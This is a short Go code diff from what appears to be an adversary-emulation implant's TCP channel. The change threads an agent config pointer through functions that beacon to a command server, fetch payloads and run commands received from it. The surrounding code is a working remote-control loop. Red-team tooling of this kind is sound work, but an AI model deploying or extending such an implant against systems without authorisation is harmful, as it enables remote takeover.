@@ -19,19 +19,19 @@ func init() {
 	CommunicationChannels["tcp"] = TCP{}
 }
 
-func (contact TCP) Communicate(agent util.AgentConfig, beacon Beacon) {
+func (contact TCP) Communicate(agent *util.AgentConfig, beacon Beacon) {
 	for {
 		conn, err := net.Dial("tcp", agent.Address)
 	   	if err != nil {
 	   		log.Printf("[-] %s is either unavailable or a firewall is blocking traffic.", agent.Address)
 	   	} else {
-	   		listen(conn, beacon)
+	   		listen(conn, beacon, agent)
 	   	}
 	   	jitterSleep(agent.Sleep, "TCP")
 	}
 }
 
-func listen(conn net.Conn, beacon Beacon) {
+func listen(conn net.Conn, beacon Beacon, agent *util.AgentConfig) {
 	//initial beacon
 	bufferedSend(conn, beacon)
 
@@ -39,11 +39,11 @@ func listen(conn net.Conn, beacon Beacon) {
     scanner := bufio.NewScanner(conn)
     for scanner.Scan() {
 		message := strings.TrimSpace(scanner.Text())
-		go respond(conn, beacon, message)
+		go respond(conn, beacon, message, agent)
     }
 }
 
-func respond(conn net.Conn, beacon Beacon, message string){
+func respond(conn net.Conn, beacon Beacon, message string, agent *util.AgentConfig){
 	var tempB Beacon
 	json.Unmarshal([]byte(util.Decrypt(message)), &tempB)
 	beacon.Links = beacon.Links[:0]
@@ -52,7 +52,7 @@ func respond(conn net.Conn, beacon Beacon, message string){
 		if len(link.Payload) > 0 {
 			payloadPath = requestPayload(link.Payload)
 		}
-		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath)
+		response, status, pid := commands.RunCommand(link.Request, link.Executor, payloadPath, agent)
 		link.Response = strings.TrimSpace(response) + "\r\n"
 		link.Status = status
 		link.Pid = pid
